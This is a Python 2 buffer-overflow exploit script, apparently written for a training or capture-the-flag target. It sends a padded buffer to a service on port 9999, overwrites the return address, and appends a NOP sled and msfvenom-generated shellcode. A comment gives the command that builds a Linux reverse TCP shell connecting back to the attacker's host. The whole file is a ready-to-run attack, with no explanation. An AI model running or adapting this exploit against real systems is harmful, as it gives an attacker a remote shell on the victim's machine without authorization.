#!/usr/bin/python2

import socket
import sys

host = "10.10.251.90"
port = 9999
offset = 524
EIP = "A" * offset
return_address = "\xf3\x12\x17\x31"
nops_sled = "\x90" * 16

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOURIP LPORT=4444 EXITFUNC=thread -b "\x00" -f c

shellcode = (
"\xdd\xc4\xd9\x74\x24\xf4\x5f\xba\x32\xe1\x78\x30\x29\xc9\xb1"
"\x12\x31\x57\x17\x03\x57\x17\x83\xf5\xe5\x9a\xc5\xc8\x3e\xad"
"\xc5\x79\x82\x01\x60\x7f\x8d\x47\xc4\x19\x40\x07\xb6\xbc\xea"
"\x37\x74\xbe\x42\x31\x7f\xd6\x5e\xd0\x6c\xd7\x37\xd0\x92\x06"
"\x94\x5d\x73\x98\x42\x0e\x25\x8b\x39\xad\x4c\xca\xf3\x32\x1c"
"\x64\x62\x1c\xd2\x1c\x12\x4d\x3b\xbe\x8b\x18\xa0\x6c\x1f\x92"
"\xc6\x20\x94\x69\x88"
)
buffer = EIP + return_address + nops_sled + shellcode + "\n"

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	s.recv(1024)
	print("[+] Sending Payloads")
	s.send(bytes(buffer))
	print("[+] Done")
except:
	print("Host is Unreachable")
	sys.exit()
